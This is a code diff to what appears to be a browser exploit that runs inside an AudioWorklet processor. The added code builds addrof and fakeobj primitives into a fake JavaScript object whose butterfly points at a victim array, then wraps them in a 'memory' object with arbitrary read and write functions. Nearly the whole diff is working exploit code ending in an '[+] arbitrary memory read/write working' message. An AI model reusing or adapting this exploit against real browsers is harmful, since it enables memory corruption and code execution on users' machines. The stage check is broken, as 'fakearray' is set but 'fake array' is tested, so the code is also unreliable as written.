@@ -544,9 +544,112 @@ b.process = (inputs, outputs, parameters)=>{
         gc();
         fuck.port.postMessage("Garbage Collected");
         //sleep(100000);
-        return false;
+	stage = "fakearray"
+        return true;
+    }
+    else if(stage == "fake array") {
+	      var print = (msg) => {
+		      fuck.port.postMessage(msg);
+	      }
+	      var structs = [];
+              var i = 0;
+              var abc = [13.37];
+              abc.pointer = 1234;
+              abc['prop' + i] = 13.37;
+              structs.push(abc);
+              var victim = structs[0];
+	      // take an array from somewhere in the middle so it is preceeded by non-null bytes which
+    // will later be treated as the butterfly length.
+    //var victim = structs[0x800];
+    print(`[+] victim @ ${addrof(victim)}`);
+
+    // craft a fake object to modify victim
+    var flags_double_array = qwordAsTagged(0x0108200700001000);
+    var container = {
+        header: flags_double_array,
+        butterfly: victim
+    };
+
+    // create object having |victim| as butterfly.
+    var containerAddr = addrof(container);
+    print(`[+] container @ ${containerAddr}`);
+    // add the offset to let compiler recognize fake structure
+    var hax = fakeobj(Add(containerAddr, new Int64(0x10)));
+    // origButterfly is now based on the offset of **victim** 
+    // because it becomes the new butterfly pointer
+    // and hax[1] === victim.pointer
+    var origButterfly = hax[1];
+
+    var memory = {
+        addrof: addrof,
+        fakeobj: fakeobj,
+
+        // Write an int64 to the given address.
+        writeInt64: function(addr, int64) {
+            hax[1] = Add(addr, new Int64(0x10)).asDouble();
+            victim.pointer = int64;
+        },
+
+        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
+        write16: function(addr, value) {
+            // Set butterfly of victim object and dereference.
+            hax[1] = Add(addr, new Int64(0x10)).asDouble();
+            victim.pointer = value;
+        },
+
+        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
+        write: function(addr, data) {
+            while (data.length % 4 != 0)
+                data.push(0);
+
+            var bytes = new Uint8Array(data);
+            var ints = new Uint16Array(bytes.buffer);
+
+            for (var i = 0; i < ints.length; i++)
+                this.write16(Add(addr, 2 * i), ints[i]);
+        },
+
+        // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
+        read64: function(addr) {
+            // Set butterfly of victim object and dereference.
+            hax[1] = Add(addr, new Int64(0x10)).asDouble();
+            //return this.addrof(victim.pointer);
+            return this.addrof(victim.pointer);
+        },
+        read: function(addr, length) {
+            var a = new Array(length);
+            var i;
+
+            for (i = 0; i + 8 < length; i += 8) {
+                v = this.read64(addr + i).bytes()
+                for (var j = 0; j < 8; j++) {
+                    a[i+j] = v[j];
+                }
+            }
+
+            v = this.read64(addr + i).bytes()
+            for (var j = i; j < length; j++) {
+                a[j] = v[j - i];
+            }
+
+            return a
+        },
+        read_i64: function(addr) {
+            return new Int64(this.read64(addr));
+        },
+    };
+
+    // Testing code, not related to exploit
+    var plainObj = {};
+    var header = memory.read64(addrof(plainObj));
+    memory.writeInt64(memory.addrof(container), header);
+    //memory.test();
+    //let memory.read_i64 = memory.read64;
+     
+    print("[+] arbitrary memory read/write working");
     }
     //  sleep(2000);
+    
     return true;
 }
 class OrigineWorklet extends AudioWorkletProcessor {
